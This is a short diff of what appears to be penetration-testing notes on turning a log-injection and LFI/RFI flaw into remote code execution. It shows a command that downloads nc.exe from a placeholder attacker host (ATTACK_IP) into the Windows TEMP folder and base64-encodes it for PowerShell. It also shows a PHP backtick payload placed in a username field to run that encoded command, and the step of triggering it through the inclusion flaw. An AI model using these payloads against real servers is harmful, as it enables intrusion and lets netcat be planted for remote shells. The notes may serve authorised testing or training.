@@ -6,7 +6,7 @@
 
 #### echo "wget http://ATTACK_IP/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
 
-#### 2) The final username value payload becomes: <<?=`powershell /enc ENCODED_PAYLOAD`?>>
+#### 2) The final username value payload becomes: <<?=`powershell /enc ENCODED_PAYLOAD`?
 
 #### 3) Abuse the LFI/RFI vulnerability to make the command execute on the server.
 
